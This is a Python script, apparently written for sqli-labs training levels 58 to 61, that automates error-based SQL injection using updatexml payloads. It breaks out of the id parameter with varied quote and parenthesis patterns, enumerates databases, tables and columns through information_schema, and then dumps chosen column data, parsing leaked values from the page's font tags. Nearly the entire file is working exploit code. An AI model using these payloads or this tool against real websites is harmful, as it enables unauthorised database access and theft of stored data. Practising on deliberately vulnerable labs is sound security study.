import requests
from bs4 import BeautifulSoup


class Less58_Less61(object):
    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c):

        if url[-1] == "/":
            self.url = url
        else:
            self.url = url + "/"

        self.level = level
        self.dbs = dbs
        self.tables = tables
        self.columns = columns
        self.schema = schema
        self.d = d
        self.t = t
        self.c = c

    def soup(self,text):

        soup = BeautifulSoup(text,"html5lib")
        strings = soup.find_all('font')[3].text   # 筛选数据

        try:
            return strings.split("~")[-2]
        except IndexError as e:
            pass

    def soup_a(self,text):

        soup = BeautifulSoup(text,"html5lib")
        strings = soup.find_all('font')[2].text   # 筛选数据

        try:
            return strings.split("~")[-2]
        except IndexError as e:
            pass

    
    def dbs_payload(self):

        count = 0

        if self.level == 58:   # level 58 payload
            while True:
                rep = requests.get(self.url+"?id=1' and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit "+str(count)+",1),0x7e),1) --+")

                try:

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                except IndexError as e:

                    if self.soup_a(rep.text) == None:

                        break

                    else:

                        print(self.soup_a(rep.text))


                count += 1


        elif self.level == 59:   # level 59 payload
            while True:
                rep = requests.get(self.url+"?id=-1 and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit "+str(count)+",1),0x7e),1) --+")

                try:

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                except IndexError as e:

                    if self.soup_a(rep.text) == None:

                        break

                    else:

                        print(self.soup_a(rep.text))

                count += 1


                                # level 60 payload
        elif self.level == 60:
            while True:
                rep = requests.get(self.url+'?id=1") and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit '+str(count)+',1),0x7e),1) --+')

                try:

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                except IndexError as e:

                    if self.soup_a(rep.text) == None:

                        break

                    else:

                        print(self.soup_a(rep.text))


                count += 1



        elif self.level == 61:   # level 61 payload

            while True:

                rep = requests.get(self.url+"?id=1')) and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit "+str(count)+",1),0x7e),1) --+")

                try:

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                except IndexError as e:

                    if self.soup_a(rep.text) == None:

                        break

                    else:

                        print(self.soup_a(rep.text))


                count += 1



    def tables_payload(self):
        count = 0
        if self.level == 58:
            while True:
                rep = requests.get(self.url+"?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e),1) --+")
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1

        elif self.level == 59:
            while True:
                rep = requests.get(self.url+"?id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e),1) --+")
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1


        elif self.level == 60:
            while True:
                rep = requests.get(self.url+'?id=1") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(count)+',1),0x7e),1) --+')
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1


        elif self.level == 61:
            while True:
                rep = requests.get(self.url+"?id=1')) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e),1) --+")
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1




    def columns_payload(self):

        count = 0


        if self.level == 58:
            while True:
                rep = requests.get(self.url+"?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(count)+",1),0x7e),1) --+")
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1



        elif self.level == 59:
            while True:
                rep = requests.get(self.url+"?id=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(count)+",1),0x7e),1) --+")
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1


        elif self.level == 60:
            while True:
                rep = requests.get(self.url+'?id=1") and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(count)+',1),0x7e),1) --+')
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1



        elif self.level == 61:
            while True:
                rep = requests.get(self.url+"?id=1')) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(count)+",1),0x7e),1) --+")
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1



    def data_payload(self):

        count = 0

        if self.level == 58:

            while True:

                rep = requests.get(self.url+"?id=1' and updatexml(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1



        elif self.level == 59:

            while True:

                rep = requests.get(self.url+"?id=1 and updatexml(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1



        elif self.level == 60:
            while True:
                rep = requests.get(self.url+'?id=1") and updatexml(1,concat(0x7e,(select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(count)+',1),0x7e),1) --+')
                if self.soup(rep.text) == None:
                    break
                else:
                    print(self.soup(rep.text))

                count += 1


        elif self.level == 61:

            while True:

                rep = requests.get(self.url+"?id=1')) and updatexml(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1


    def DBS(self):
        self.dbs_payload()

    def TABLES(self):           # 使用对应的payload
        self.tables_payload()

    def COLUMNS(self):
        self.columns_payload()

    def SCHEMA(self):
        self.data_payload()

    def TYPE(self):

        if self.dbs:  # 如果枚举数据库被设置
            self.DBS()

        elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置
            self.TABLES()

        elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置
            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置
            self.SCHEMA()

        else:
            print("wrong options and bad type!")


    def Less_58(self):
        self.TYPE()

    def Less_59(self):
        self.TYPE()

    def Less_60(self):
        self.TYPE()
                              # 调用对应的level 等级
    def Less_61(self):
        self.TYPE()

